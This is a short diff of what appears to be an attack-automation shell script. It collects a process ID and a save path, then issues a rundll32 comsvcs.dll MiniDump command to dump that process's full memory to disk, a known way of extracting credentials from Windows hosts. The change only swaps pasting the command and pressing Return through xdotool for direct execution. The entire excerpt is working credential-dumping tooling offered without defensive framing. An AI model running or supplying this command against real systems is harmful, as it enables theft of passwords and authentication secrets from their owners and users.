@@ -14,5 +14,5 @@ generate_form "${SAVE_LOCATION_FIELD}" "${PROCESS_ID_FIELD}"
 SAVE_LOCATION=${form_data["save_location"]}
 PROCESS_ID=${form_data["process_id"]}
 
-paste_command "rundll32 C:\windows\system32\comsvcs.dll, MiniDump ${PROCESS_ID} ${SAVE_LOCATION} full"
-xdotool key Return
+execute_command "rundll32 C:\windows\system32\comsvcs.dll, MiniDump ${PROCESS_ID} ${SAVE_LOCATION} full"
+create_new_line
